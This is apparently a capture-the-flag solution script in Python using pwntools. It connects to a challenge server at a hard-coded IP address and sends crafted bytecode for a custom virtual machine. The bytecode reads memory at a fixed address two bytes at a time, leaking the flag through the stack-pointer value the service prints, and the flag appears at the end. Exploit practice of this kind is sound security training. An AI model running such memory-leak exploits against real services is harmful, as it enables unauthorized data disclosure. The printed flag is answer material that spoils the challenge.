import binascii
from pwn import *


def pack(a, b, c, d=None):
    if d is not None:
        return p16((a << 12) + (b << 8) + (c << 4) + d)
    return p16((a << 12) + (b << 8) + c)


# add imm 0 to r0
NOP = pack(10, 0, 0)

flag = ''

offset = 0
while offset < 0x50:
    p = remote('128.199.231.44', 12341)

    # read code map address
    payload = ''

    # r3 = 0x0804
    payload += (pack(8, 3, 0x08) + pack(9, 3, 0x04)) * 3

    # r2 = 0xd0c0 + offset
    low = 0xd0c0 + offset
    payload += (pack(8, 2, low >> 8) + pack(9, 2, low & 0xff)) * 3

    # sp = *((r3 << 16) + r2)
    payload += pack(4, 0xf, 4, 2)

    # abort
    payload += pack(5, 0xf, 0xff)

    p.recvuntil('input length: ')
    p.send(str(len(payload)))

    p.recvuntil('your asm: ')
    p.send(payload)

    p.recvuntil('sp:\t\t')
    cand = ''.join(binascii.unhexlify('%04x' % int(p.recvline().strip(), 16))[::-1])
    p.close()

    if cand != '\x00\x00':
        flag += cand
        print flag
        offset += 2

# KAPO{i_will_be_back__end_of_this_year}
